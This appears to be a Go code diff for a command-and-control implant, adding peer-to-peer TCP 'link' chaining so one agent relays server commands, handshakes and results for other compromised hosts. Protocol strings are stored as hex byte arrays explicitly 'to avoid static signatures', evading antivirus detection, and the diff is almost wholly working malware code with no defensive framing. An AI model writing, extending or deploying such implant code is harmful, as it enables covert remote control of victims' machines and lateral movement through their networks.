@@ -25,18 +25,30 @@ import (
 
 // Polling strings (constructed to avoid static signatures)
 var (
-	pollContentTypeJson  = string([]byte{0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e})                   // application/json
-	pollStatusKey        = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                                               // status
-	pollCmdRekey         = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79})                                                                                     // rekey
-	pollStatusNoCommands = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                 // no_commands
+	pollContentTypeJson   = string([]byte{0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e})                                                       // application/json
+	pollStatusKey         = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                                                                                   // status
+	pollCmdRekey          = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79})                                                                                                                         // rekey
+	pollStatusNoCommands  = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                                                     // no_commands
+	pollKeyAgentID        = string([]byte{0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x69, 0x64})                                                                                                       // agent_id
+	pollKeyResults        = string([]byte{0x72, 0x65, 0x73, 0x75, 0x6c, 0x74, 0x73})                                                                                                             // results
+	pollKeyLinkUnlink     = string([]byte{0x6c, 0x75})                                                                                                                                           // lu
+	pollKeyRoutingID      = string([]byte{0x72})                                                                                                                                                 // r
+	pollKeyPayload        = string([]byte{0x70})                                                                                                                                                 // p
+	pollMsgType           = string([]byte{0x74, 0x79, 0x70, 0x65})                                                                                                                               // type
+	pollMsgPayload        = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // payload
+	pollTypeHandshakeResp = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65, 0x5f, 0x72, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65})                                           // handshake_response
 )
 
 // Malleable field values (constructed to avoid static signatures)
 var (
-	MALLEABLE_REKEY_COMMAND      = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})             // rekey_required
-	MALLEABLE_REKEY_STATUS_FIELD = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                             // status
-	MALLEABLE_REKEY_DATA_FIELD   = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                         // data
-	MALLEABLE_REKEY_ID_FIELD     = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                   // command_db_id
+	MALLEABLE_REKEY_COMMAND             = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})          // rekey_required
+	MALLEABLE_REKEY_STATUS_FIELD        = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                          // status
+	MALLEABLE_REKEY_DATA_FIELD          = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                      // data
+	MALLEABLE_REKEY_ID_FIELD            = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                // command_db_id
+	MALLEABLE_LINK_DATA_FIELD           = string([]byte{0x6c, 0x64})                                                                                  // ld
+	MALLEABLE_LINK_COMMANDS_FIELD       = string([]byte{0x6c, 0x63})                                                                                  // lc
+	MALLEABLE_LINK_HANDSHAKE_FIELD      = string([]byte{0x6c, 0x68})                                                                                  // lh
+	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = string([]byte{0x6c, 0x72})                                                                                  // lr
 )
 
 // PollConfig holds the configuration for polling behavior
@@ -475,6 +487,32 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		return fmt.Errorf(Err(E19))
 	}
 
+	// IMPORTANT: Process handshake responses BEFORE commands!
+	// The TCP agent is waiting in performHandshake for the handshake_response.
+	// If we send a command first, the TCP agent will receive "data" when expecting
+	// "handshake_response", fail the handshake, and close the connection.
+
+	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
+		if linkRespData, ok := linkRespVal.([]interface{}); ok {
+			processLinkHandshakeResponses(linkRespData)
+		}
+	}
+
+	// Now process link commands (for forwarding to TCP agents after handshake is complete)
+	// These are in the outer layer, not encrypted with our key
+	if linkCmdsVal, ok := responseMap[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
+		if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
+			processLinkCommands(linkCmdsData)
+
+			// After processing link commands, immediately send any queued responses
+			// This enables faster round-trip for linked agent commands
+			linkData := GetLinkManager().GetOutboundData()
+			if len(linkData) > 0 {
+				sendImmediateLinkData(secureComms, customHeaders, linkData)
+			}
+		}
+	}
+
 	// Check for no commands
 	if responseStatus == pollStatusNoCommands {
 		return nil
@@ -509,6 +547,163 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	}
 
 	return nil
+}
+
+// sendImmediateLinkData sends link data to the server without waiting for the next poll cycle
+// This enables faster round-trip for linked agent command responses
+func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]string, linkData []*LinkDataOut) {
+	if len(linkData) == 0 {
+		return
+	}
+
+	// Build payload with only link data
+	payload := make(map[string]interface{})
+	payload[pollKeyAgentID] = clientID
+	payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		// Re-queue the data so it's not lost
+		requeueLinkData(linkData)
+		return
+	}
+
+	encrypted, err := secureComms.EncryptMessage(string(jsonData))
+	if err != nil {
+		// Re-queue the data so it's not lost
+		requeueLinkData(linkData)
+		return
+	}
+
+	if err := sendResults(encrypted, customHeaders); err != nil {
+		// Re-queue the data so it's not lost - will be sent on next poll cycle
+		requeueLinkData(linkData)
+	} else {
+		secureComms.RotateSecret()
+	}
+}
+
+// requeueLinkData puts link data back into the outbound queue when immediate send fails
+func requeueLinkData(linkData []*LinkDataOut) {
+	lm := GetLinkManager()
+	for _, item := range linkData {
+		lm.queueOutboundData(item)
+	}
+}
+
+// processLinkCommands forwards commands from the server to linked TCP agents
+// and waits briefly for responses to enable faster round-trips
+func processLinkCommands(linkCmds []interface{}) {
+	lm := GetLinkManager()
+
+	// Timeout for waiting for command responses
+	const commandResponseTimeout = 5 * time.Second
+
+	for _, cmd := range linkCmds {
+		cmdMap, ok := cmd.(map[string]interface{})
+		if !ok {
+			continue
+		}
+
+		// Extract routing ID and payload using malleable field names
+		routingID, _ := cmdMap[pollKeyRoutingID].(string)
+		payload, _ := cmdMap[pollKeyPayload].(string)
+
+		if routingID == "" || payload == "" {
+			continue
+		}
+
+		// Extract transform padding lengths (if present, use raw mode)
+		prependLen := 0
+		appendLen := 0
+		transformed := false
+		if pre, ok := cmdMap["pre"].(float64); ok {
+			prependLen = int(pre)
+		}
+		if app, ok := cmdMap["app"].(float64); ok {
+			appendLen = int(app)
+		}
+		// Check for transform flag (used when transforms don't have random padding)
+		if t, ok := cmdMap["t"].(bool); ok && t {
+			transformed = true
+		}
+
+		// Forward to the linked agent and wait for response
+		var response *LinkDataOut
+		var err error
+
+		if transformed || prependLen > 0 || appendLen > 0 {
+			// Transforms are used - forward raw bytes
+			response, err = lm.ForwardToLinkedAgentRawAndWait(routingID, payload, prependLen, appendLen, commandResponseTimeout)
+		} else {
+			// Legacy mode - wrap in JSON envelope
+			response, err = lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
+		}
+
+		if err != nil {
+			continue
+		}
+
+		if response != nil {
+			lm.queueOutboundData(response)
+		}
+	}
+}
+
+// processLinkHandshakeResponses forwards handshake responses from server to TCP agents
+func processLinkHandshakeResponses(responses []interface{}) {
+	lm := GetLinkManager()
+
+	for _, resp := range responses {
+		respMap, ok := resp.(map[string]interface{})
+		if !ok {
+			continue
+		}
+
+		// Extract routing ID and payload
+		routingID, _ := respMap[pollKeyRoutingID].(string)
+		payload, _ := respMap[pollKeyPayload].(string)
+
+		if routingID == "" || payload == "" {
+			continue
+		}
+
+		// Get the linked agent - use direct map access to bypass IsActive check
+		// Handshake responses are critical and should be attempted even if link appears inactive
+		lm.mu.RLock()
+		link, exists := lm.links[routingID]
+		lm.mu.RUnlock()
+
+		if !exists || link == nil {
+			continue
+		}
+
+		// Send handshake response to TCP agent
+		// Include the lr array for forwarding to grandchildren (TCP chains)
+		message := map[string]interface{}{
+			pollMsgType:    pollTypeHandshakeResp,
+			pollMsgPayload: payload,
+			"lr":           []interface{}{respMap}, // Include for forwarding to grandchildren
+		}
+
+		data, err := json.Marshal(message)
+		if err != nil {
+			continue
+		}
+
+		// Try to send regardless of IsActive - the TCP agent may be waiting with long timeout
+		link.mu.Lock()
+		if link.Conn != nil {
+			if err := writeMessage(link.Conn, data); err == nil {
+				link.LastSeen = time.Now()
+				// Re-activate link if it was marked inactive due to read timeout
+				if !link.IsActive {
+					link.IsActive = true
+				}
+			}
+		}
+		link.mu.Unlock()
+	}
 }
 
 // startPolling initializes and starts the polling routine
@@ -572,31 +767,59 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				nextInterval = backoffInterval
 			}
 
-			if resultManager.HasResults() {
+			// Collect link data from connected TCP agents (if any)
+			linkData := GetLinkManager().GetOutboundData()
+			// Collect link handshake data (for new linked agents, sent via "lh" field)
+			linkHandshake := GetLinkManager().GetHandshakeData()
+			// Collect unlink notifications (routing IDs that have been disconnected)
+			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()
+
+			// Handle pending results before sleep
+			hasResults := resultManager.HasResults()
+			hasLinkData := len(linkData) > 0
+			hasLinkHandshake := linkHandshake != nil
+			hasUnlinkNotifications := len(unlinkNotifications) > 0
+
+			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
 				results := resultManager.GetPendingResults()
+				payload := make(map[string]interface{})
+				payload[pollKeyAgentID] = clientID
+
 				if len(results) > 0 {
-					encryptedData := struct {
-						AgentID string            `json:"agent_id"`
-						Results []CommandResponse `json:"results"`
-					}{
-						AgentID: clientID,
-						Results: results,
-					}
-					jsonData, err := json.Marshal(encryptedData)
+					payload[pollKeyResults] = results
+				}
+				if hasLinkData {
+					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+				}
+				if hasLinkHandshake {
+					// Send handshake as single object via "lh" field
+					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake
+				}
+				if hasUnlinkNotifications {
+					payload[pollKeyLinkUnlink] = unlinkNotifications
+				}
+
+				jsonData, err := json.Marshal(payload)
+				if err == nil {
+					encrypted, err := secureComms.EncryptMessage(string(jsonData))
 					if err == nil {
-						encrypted, err := secureComms.EncryptMessage(string(jsonData))
-						if err == nil {
-							if err := sendResults(encrypted, customHeaders); err == nil {
-								for _, result := range results {
-									if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
-										commandQueue.mu.Lock()
-										if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
-											delete(commandQueue.activeDownloads, result.Filename)
-										}
-										commandQueue.mu.Unlock()
+						if err := sendResults(encrypted, customHeaders); err == nil {
+							for _, result := range results {
+								if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
+									commandQueue.mu.Lock()
+									if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
+										delete(commandQueue.activeDownloads, result.Filename)
 									}
+									commandQueue.mu.Unlock()
 								}
-								secureComms.RotateSecret()
+							}
+							secureComms.RotateSecret()
+
+							// If we just sent a handshake, do an immediate poll to get the response
+							// instead of waiting for the full poll interval
+							if hasLinkHandshake {
+								time.Sleep(500 * time.Millisecond) // Brief delay for server processing
+								doPoll(secureComms, customHeaders)
 							}
 						}
 					}
